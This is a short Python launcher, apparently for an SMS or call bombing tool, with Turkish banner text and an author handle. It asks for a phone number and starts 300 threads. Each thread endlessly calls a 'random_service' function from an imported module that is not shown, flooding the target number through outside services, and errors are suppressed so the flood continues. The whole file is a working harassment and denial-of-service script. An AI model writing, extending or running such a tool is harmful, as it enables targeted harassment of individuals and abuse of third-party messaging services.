import sys, os, pyfiglet
from rootService import Distribution_Service
from threading import Thread
from colorama import Fore

attack_number_phone = Distribution_Service()

def start(phone):
        attack_number_phone.phone(phone)

        while True:
            try:
                attack_number_phone.random_service()
            except Exception as ex:
                print(ex)

os.system('clear')

print(Fore.RED + pyfiglet.figlet_format("K4HİNz"))


print('SADECE ÖLÜLER GÖREBİLİR...')
print(Fore.GREEN + 'İnstagram: @k4hinz')
print(Fore.BLUE + '++++++++++++++++++')
print(Fore.YELLOW + '============')
phone = input('NUMARA: ')

try:
        attack_number_phone.phone(phone)
except:
        print(Fore.RED + 'Numarayı Yanlış Girdiniz Tekrar Deneyin ÖRNEK: +905551235500')
        sys.exit()


for i in range(300):
        th = Thread(target=start, args=(phone,))
        th.start()
